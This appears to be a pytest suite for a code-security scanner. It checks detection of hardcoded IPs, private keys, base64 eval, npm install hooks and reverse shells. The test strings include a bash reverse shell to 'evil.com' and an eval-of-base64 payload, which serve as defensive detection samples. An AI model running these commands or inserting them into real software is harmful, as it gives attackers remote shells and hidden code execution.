"""Tests for scanner logic — _scan_content, file type filtering, exclude patterns."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
from scanner import _scan_content, ScanResult, Finding
from patterns import RED_FLAG, WARNING, INFO


@pytest.fixture
def result():
    return ScanResult("test", "repo", "deep")


# ============================================================
# _scan_content — basic pattern matching
# ============================================================

class TestScanContent:

    def test_detects_hardcoded_ip(self, result):
        content = "server_addr = '8.8.8.8'"
        _scan_content(content, "config.py", result)
        names = [f.name for f in result.findings]
        assert "Hardcoded IP address" in names

    def test_detects_private_key(self, result):
        content = "-----BEGIN RSA PRIVATE KEY-----"
        _scan_content(content, "keys.txt", result)
        names = [f.name for f in result.findings]
        assert "Private key block" in names

    def test_detects_eval_base64(self, result):
        content = "eval(base64.b64decode('payload'))"
        _scan_content(content, "evil.py", result)
        names = [f.name for f in result.findings]
        assert "Python eval/exec with string construction" in names

    def test_detects_reverse_shell(self, result):
        content = "bash -i >& /dev/tcp/evil.com/4444 0>&1"
        _scan_content(content, "shell.sh", result)
        names = [f.name for f in result.findings]
        assert "Bash reverse shell pattern" in names


# ============================================================
# File type filtering
# ============================================================

class TestFileTypeFiltering:

    def test_npm_pattern_only_matches_json(self, result):
        """npm install hook patterns should only trigger on .json files."""
        content = '"postinstall": "node evil.js"'
        _scan_content(content, "readme.md", result)
        # Should NOT match because .md is not in file_types for this pattern
        npm_findings = [f for f in result.findings
                        if f.name == "npm preinstall/postinstall script"]
        assert len(npm_findings) == 0

    def test_npm_pattern_matches_package_json(self, result):
        """npm patterns should trigger on package.json."""
        content = '"postinstall": "node evil.js"'
        _scan_content(content, "package.json", result)
        npm_findings = [f for f in result.findings
                        if f.name == "npm preinstall/postinstall script"]
        assert len(npm_findings) == 1

    def test_python_eval_only_matches_py(self, result):
        """Python eval/exec pattern only applies to .py files."""
        content = "eval(base64.b64decode('test'))"
        _scan_content(content, "notes.txt", result)
        eval_findings = [f for f in result.findings
                         if f.name == "Python eval/exec with string construction"]
        assert len(eval_findings) == 0

    def test_sudo_only_matches_shell_files(self, result):
        """Sudo pattern should only trigger on shell scripts."""
        content = "sudo apt-get install something"
        _scan_content(content, "instructions.md", result)
        sudo_findings = [f for f in result.findings if f.name == "Sudo in script"]
        assert len(sudo_findings) == 0

    def test_sudo_matches_sh_file(self, result):
        content = "sudo apt-get install something"
        _scan_content(content, "setup.sh", result)
        sudo_findings = [f for f in result.findings if f.name == "Sudo in script"]
        assert len(sudo_findings) == 1


# ============================================================
# Exclude pattern suppression
# ============================================================

class TestExcludePatterns:

    def test_private_ip_excluded(self, result):
        """Private IPs should be suppressed by the exclude pattern."""
        content = "server = '192.168.1.1'"
        _scan_content(content, "config.py", result)
        ip_findings = [f for f in result.findings
                       if f.name == "Hardcoded IP address"]
        assert len(ip_findings) == 0

    def test_public_ip_not_excluded(self, result):
        content = "server = '8.8.4.4'"
        _scan_content(content, "config.py", result)
        ip_findings = [f for f in result.findings
                       if f.name == "Hardcoded IP address"]
        assert len(ip_findings) == 1

    def test_placeholder_token_excluded(self, result):
        """Tokens with placeholder names should be suppressed."""
        content = "api_key = 'example_key_abcdefghijklmnop'"
        _scan_content(content, "config.py", result)
        token_findings = [f for f in result.findings
                          if f.name == "Hardcoded API token/key pattern"]
        assert len(token_findings) == 0


# ============================================================
# One match per pattern per file
# ============================================================

class TestOneMatchPerPattern:

    def test_only_first_match_reported(self, result):
        """Scanner should report only the first match per pattern per file."""
        content = "server1 = '8.8.8.8'\nserver2 = '1.1.1.1'"
        _scan_content(content, "config.py", result)
        ip_findings = [f for f in result.findings
                       if f.name == "Hardcoded IP address"]
        assert len(ip_findings) == 1

    def test_different_patterns_both_reported(self, result):
        """Different patterns should each report independently."""
        content = (
            "server = '8.8.8.8'\n"
            "-----BEGIN RSA PRIVATE KEY-----\n"
        )
        _scan_content(content, "config.py", result)
        assert len(result.findings) >= 2


# ============================================================
# Finding metadata
# ============================================================

class TestFindingMetadata:

    def test_finding_has_line_number(self, result):
        content = "line one\nserver = '8.8.8.8'\nline three"
        _scan_content(content, "config.py", result)
        ip_findings = [f for f in result.findings
                       if f.name == "Hardcoded IP address"]
        assert len(ip_findings) == 1
        assert ip_findings[0].line_number == 2

    def test_finding_has_file_path(self, result):
        content = "server = '8.8.8.8'"
        _scan_content(content, "src/config.py", result)
        assert result.findings[0].file_path == "src/config.py"

    def test_finding_has_matched_text(self, result):
        content = "server = '8.8.8.8'"
        _scan_content(content, "config.py", result)
        assert "8.8.8.8" in result.findings[0].matched_text

    def test_long_match_truncated(self, result):
        """Matched text longer than 200 chars should be truncated."""
        # Create a line with a very long base64 string
        b64 = "A" * 300
        content = f'data = "{b64}"'
        _scan_content(content, "data.py", result)
        b64_findings = [f for f in result.findings
                        if f.name == "Long base64 string"]
        if b64_findings:
            assert len(b64_findings[0].matched_text) <= 203  # 200 + "..."


# ============================================================
# target_files constraint
# ============================================================

class TestTargetFiles:

    def test_setup_py_pattern_matches_setup_py(self, result):
        content = "os.system('make install')"
        _scan_content(content, "setup.py", result)
        findings = [f for f in result.findings
                    if f.name == "Python setup.py with subprocess/os.system"]
        assert len(findings) == 1

    def test_setup_py_pattern_skips_other_py(self, result):
        """setup.py-specific patterns should NOT trigger on other .py files."""
        content = "subprocess.run(['make', 'install'])"
        _scan_content(content, "build_helper.py", result)
        findings = [f for f in result.findings
                    if f.name == "Python setup.py with subprocess/os.system"]
        assert len(findings) == 0
